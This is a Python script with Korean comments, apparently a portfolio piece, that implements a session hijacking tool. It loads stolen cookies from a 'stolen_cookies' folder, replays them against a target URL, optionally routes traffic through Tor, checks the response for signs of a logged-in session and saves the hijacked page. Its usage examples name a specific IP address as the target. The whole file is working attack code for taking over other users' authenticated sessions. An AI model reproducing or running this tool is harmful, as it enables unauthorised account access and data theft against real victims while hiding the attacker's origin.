#!/usr/bin/env python3
"""
Session Hijacker - 탈취한 쿠키로 세션 하이재킹
포트폴리오 목적: 쿠키 기반 세션 하이재킹 시뮬레이션
"""

import requests
import json
import os
import sys
from datetime import datetime
import argparse

# ANSI 색상 코드
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def load_stolen_cookie(cookie_file=None):
    """
    탈취한 쿠키 로드

    Args:
        cookie_file: 쿠키 파일 경로 (None이면 최신 파일 사용)
    """
    cookie_dir = 'stolen_cookies'

    if not os.path.exists(cookie_dir):
        print(f"{Colors.RED}❌ Cookie directory not found: {cookie_dir}{Colors.END}")
        return None

    if cookie_file is None:
        # 최신 쿠키 파일 선택
        files = [f for f in os.listdir(cookie_dir) if f.endswith('.json')]
        if not files:
            print(f"{Colors.RED}❌ No cookie files found{Colors.END}")
            return None
        cookie_file = sorted(files, reverse=True)[0]

    file_path = os.path.join(cookie_dir, cookie_file)

    try:
        with open(file_path, 'r') as f:
            data = json.load(f)
        print(f"{Colors.GREEN}✓ Loaded cookie from: {cookie_file}{Colors.END}")
        return data
    except Exception as e:
        print(f"{Colors.RED}❌ Failed to load cookie: {e}{Colors.END}")
        return None

def parse_cookie_string(cookie_string):
    """쿠키 문자열을 딕셔너리로 변환"""
    cookies = {}
    for item in cookie_string.split(';'):
        item = item.strip()
        if '=' in item:
            key, value = item.split('=', 1)
            cookies[key] = value
    return cookies

def hijack_session(target_url, cookie_data, use_tor=False):
    """
    탈취한 쿠키로 세션 하이재킹

    Args:
        target_url: 접근할 URL
        cookie_data: 탈취한 쿠키 데이터
        use_tor: Tor 사용 여부
    """
    print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.HEADER}🔓 Session Hijacker{Colors.END}")
    print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")

    # 세션 설정
    session = requests.Session()

    if use_tor:
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        print(f"{Colors.BLUE}🕵️  Using Tor proxy{Colors.END}")

    # User-Agent 설정
    if 'user_agent' in cookie_data:
        session.headers['User-Agent'] = cookie_data['user_agent']
        print(f"{Colors.BLUE}🌐 User-Agent: {cookie_data['user_agent'][:50]}...{Colors.END}")

    # 쿠키 설정
    cookie_string = cookie_data['cookie']
    cookies = parse_cookie_string(cookie_string)

    print(f"{Colors.BLUE}🍪 Cookies:{Colors.END}")
    for key, value in cookies.items():
        session.cookies.set(key, value)
        print(f"   {key} = {value[:30]}{'...' if len(value) > 30 else ''}")

    print(f"\n{Colors.YELLOW}📡 Accessing: {target_url}{Colors.END}\n")

    try:
        # 세션으로 접근
        response = session.get(target_url, timeout=10)

        print(f"{Colors.BOLD}Response:{Colors.END}")
        print(f"   Status Code: {response.status_code}")
        print(f"   Content Length: {len(response.text)} bytes")

        # 성공 여부 판단
        if response.status_code == 200:
            # 로그인 상태 확인 (간단한 휴리스틱)
            indicators = ['logout', 'profile', 'dashboard', 'settings']
            found_indicators = [ind for ind in indicators if ind.lower() in response.text.lower()]

            if found_indicators:
                print(f"\n{Colors.GREEN}{'='*70}{Colors.END}")
                print(f"{Colors.GREEN}✓ Session Hijack Successful!{Colors.END}")
                print(f"{Colors.GREEN}{'='*70}{Colors.END}")
                print(f"{Colors.GREEN}Found indicators: {', '.join(found_indicators)}{Colors.END}\n")

                # 세션 정보 저장
                hijack_info = {
                    'timestamp': datetime.now().isoformat(),
                    'target_url': target_url,
                    'status_code': response.status_code,
                    'cookies_used': cookies,
                    'found_indicators': found_indicators,
                    'response_preview': response.text[:500]
                }

                with open('hijacked_session.json', 'w') as f:
                    json.dump(hijack_info, f, indent=2)

                print(f"💾 Session info saved to: hijacked_session.json\n")

                # HTML 저장
                with open('hijacked_page.html', 'w') as f:
                    f.write(response.text)
                print(f"💾 Page saved to: hijacked_page.html\n")

                return True
            else:
                print(f"\n{Colors.YELLOW}⚠ Session may not be valid (no login indicators found){Colors.END}\n")
                return False
        else:
            print(f"\n{Colors.RED}❌ Failed: HTTP {response.status_code}{Colors.END}\n")
            return False

    except Exception as e:
        print(f"\n{Colors.RED}❌ Error: {e}{Colors.END}\n")
        return False

def list_stolen_cookies():
    """저장된 쿠키 목록 출력"""
    cookie_dir = 'stolen_cookies'

    if not os.path.exists(cookie_dir):
        print(f"{Colors.RED}❌ No stolen cookies found{Colors.END}")
        return

    files = [f for f in os.listdir(cookie_dir) if f.endswith('.json')]
    if not files:
        print(f"{Colors.RED}❌ No cookie files found{Colors.END}")
        return

    print(f"\n{Colors.BOLD}📂 Stolen Cookies:{Colors.END}\n")
    for idx, filename in enumerate(sorted(files, reverse=True), 1):
        file_path = os.path.join(cookie_dir, filename)
        with open(file_path, 'r') as f:
            data = json.load(f)
        print(f"{idx}. {filename}")
        print(f"   Time: {data['timestamp']}")
        print(f"   IP: {data['ip']}")
        print(f"   Cookie: {data['cookie'][:50]}...")
        print()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Session Hijacker - Use stolen cookies to hijack sessions',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # 최신 쿠키로 세션 하이재킹
  python3 session_hijacker.py -t http://3.34.90.201/index.php

  # 특정 쿠키 파일 사용
  python3 session_hijacker.py -t http://3.34.90.201/profile.php -c cookie_20250101_120000.json

  # Tor 사용
  python3 session_hijacker.py -t http://3.34.90.201/index.php --tor

  # 저장된 쿠키 목록 확인
  python3 session_hijacker.py --list
        '''
    )

    parser.add_argument('-t', '--target', help='Target URL to access with hijacked session')
    parser.add_argument('-c', '--cookie', help='Cookie file name (default: latest)')
    parser.add_argument('--tor', action='store_true', help='Use Tor proxy')
    parser.add_argument('--list', action='store_true', help='List all stolen cookies')

    args = parser.parse_args()

    if args.list:
        list_stolen_cookies()
        sys.exit(0)

    if not args.target:
        parser.print_help()
        print(f"\n{Colors.RED}❌ Error: --target is required{Colors.END}")
        sys.exit(1)

    # 쿠키 로드
    cookie_data = load_stolen_cookie(args.cookie)
    if not cookie_data:
        sys.exit(1)

    # 세션 하이재킹
    success = hijack_session(args.target, cookie_data, args.tor)
    sys.exit(0 if success else 1)
